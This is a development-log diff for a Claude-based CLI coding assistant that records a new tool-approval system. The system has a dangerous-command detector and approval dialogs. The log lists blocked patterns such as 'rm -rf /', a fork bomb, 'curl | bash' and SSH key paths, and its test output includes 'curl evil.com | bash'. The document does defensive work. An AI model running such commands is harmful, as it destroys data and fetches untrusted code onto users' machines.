@@ -437,11 +437,181 @@ Tool Input: {'command': 'ls -la', 'timeout': 60}
 
 ### Next Phase
 
-**Phase 5: Permission & Approval System** (Planned)
-- Interactive prompts before tool execution
-- Arrow key navigation (↑/↓ to select, Enter to approve, Esc to deny)
-- Batch approval for multiple tools
-- Auto-approve mode toggle
-- Dangerous command warnings
-
 **Status**: Phase 4 Complete ✅
+
+---
+
+## Phase 5 Update: Permission & Approval System
+
+**Commit**: (to be determined)
+**Date**: 2025-11-17
+
+### Features Implemented
+
+#### Permission System Module (`src/devorbit/cli/permissions.py`)
+- **DangerousCommandDetector Class** (90 lines)
+  - Pattern-based dangerous command detection
+  - 12 dangerous patterns detected:
+    * `rm -rf /` and `rm -rf *` (destructive deletion)
+    * `dd if=` commands (disk overwrite)
+    * `mkfs.` and `format` (filesystem formatting)
+    * Write to `/dev/sd*` devices
+    * `fdisk` disk partitioning
+    * `curl | bash` and `wget | sh` (piped execution)
+    * `chmod 777` (overly permissive)
+    * `sudo rm` (privileged deletion)
+    * Fork bombs `:(){ :|:& };:`
+  - System file path detection:
+    * `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/hosts`
+    * `/boot`, `/sys`, `/proc`
+    * `~/.ssh/id_rsa`, `~/.ssh/authorized_keys`
+  - Tool-specific safety checks for `bash`, `write_file`, `edit_file`
+
+- **ToolApprovalPrompt Class** (270 lines)
+  - Interactive approval dialogs using `radiolist_dialog`
+  - Arrow key navigation (↑/↓ to select, Enter to confirm)
+  - Formatted tool detail display for each tool type
+  - Single tool approval flow
+  - Batch tool approval with three options:
+    * Approve All - Execute all tools (safe only)
+    * Approve Each - Review individually
+    * Deny All - Skip all tools
+  - Dangerous command warnings with highlighted UI
+  - Auto-approve mode support (non-dangerous only)
+  - Tool denial sends error to Claude for proper handling
+
+#### Integration Changes
+
+**Session (`src/devorbit/cli/session.py`)**
+- Added `auto_approve_tools: bool` parameter
+- Initialize `ToolApprovalPrompt` instance
+- Pass approval state throughout session
+
+**LLM Handler (`src/devorbit/cli/llm.py`)**
+- Call `approve_batch()` before executing tools
+- Handle both streaming and non-streaming paths
+- Send tool denial results back to Claude
+- Skip execution for denied tools
+
+**CLI Main (`src/devorbit/cli/main.py`)**
+- Added `--auto-approve` flag
+- Pass flag to session initialization
+
+### Testing
+
+**Test Script**: `test_permissions.py` (175 lines)
+- Tests 18 dangerous command scenarios
+- Tests 17 specific pattern matches
+- Validates both dangerous and safe commands
+- Tests file path safety checks
+- ✅ **All 35 tests passing**
+
+**Sample Test Results**:
+```
+✓ rm -rf / - Dangerous detected
+✓ dd if=/dev/zero - Dangerous detected
+✓ curl evil.com | bash - Dangerous detected
+✓ write to /etc/passwd - Dangerous detected
+✓ ls -la - Safe (not flagged)
+✓ git status - Safe (not flagged)
+✓ write to README.md - Safe (not flagged)
+```
+
+### User Experience
+
+**Non-Dangerous Command Flow**:
+```
+1. Claude requests tool execution
+2. If --auto-approve: Execute immediately
+3. Otherwise: Show approval dialog
+4. User selects Approve/Deny with arrow keys
+5. Tool executes or denial sent to Claude
+```
+
+**Dangerous Command Flow**:
+```
+1. Claude requests dangerous tool
+2. ⚠️ DANGER WARNING displayed
+3. Approval dialog defaults to "Deny"
+4. User must explicitly select "Approve"
+5. Even in auto-approve mode, dangerous commands prompt
+```
+
+**Batch Tool Flow**:
+```
+1. Claude requests multiple tools
+2. Batch summary shown: "Execute 3 tools"
+3. Options:
+   - Approve All (if no dangerous)
+   - Approve Each (review individually)
+   - Deny All
+4. If contains dangerous: defaults to "Approve Each"
+```
+
+### Code Statistics
+
+**Phase 5 Additions:**
+- 1 new file: `permissions.py` (370 lines)
+- 3 modified files: `session.py` (+5 lines), `llm.py` (+38 lines), `main.py` (+8 lines)
+- 1 test file: `test_permissions.py` (175 lines)
+- Total: 596 new lines
+
+**Cumulative (All 5 Phases):**
+- Phase 1: 1,419 lines (Terminal UI)
+- Phase 2: 785 lines (Enhanced Input)
+- Phase 3: 193 lines (LLM Integration)
+- Phase 4: 669 lines (Tool Execution)
+- Phase 5: 596 lines (Permission System)
+- **Grand Total: 3,662 lines of production code**
+
+### What Works Now
+
+✅ **Interactive Approval**: Prompts before every tool execution
+✅ **Arrow Key Navigation**: Select approve/deny with keyboard
+✅ **Dangerous Command Detection**: 12 destructive patterns detected
+✅ **System File Protection**: Prevents modification of sensitive files
+✅ **Batch Approval**: Efficient handling of multiple tools
+✅ **Auto-Approve Mode**: Flag for non-dangerous commands (`--auto-approve`)
+✅ **Tool Denial Handling**: Claude receives error when tools denied
+✅ **Safety First**: Dangerous commands always prompt, even in auto-approve
+
+### Security Features
+
+🔒 **Pattern Matching**:
+- Regular expressions for command analysis
+- Case-insensitive matching
+- Word boundary detection to avoid false positives
+
+🔒 **Path Validation**:
+- System directory protection
+- SSH key protection
+- Configuration file protection
+
+🔒 **User Control**:
+- Explicit approval required for dangerous operations
+- Clear warnings with reason displayed
+- Default to "Deny" for dangerous commands
+
+### Known Limitations
+
+⚠️ **Pattern Bypass**: Sophisticated users could potentially bypass pattern detection with command obfuscation (e.g., base64 encoding). This is acceptable for an AI assistant tool where the user is aware of what commands are being run.
+
+⚠️ **No Sandboxing**: Tools execute with user's full permissions. No containerization or privilege dropping.
+
+### Usage Examples
+
+**With approval prompts** (default):
+```bash
+$ devorbit --provider anthropic
+> write a script to clean up old logs
+[Approval dialog appears for each tool]
+```
+
+**With auto-approve** (non-dangerous only):
+```bash
+$ devorbit --provider anthropic --auto-approve
+> write a script to clean up old logs
+[Safe commands execute immediately, dangerous still prompt]
+```
+
+**Status**: Phase 5 Complete ✅
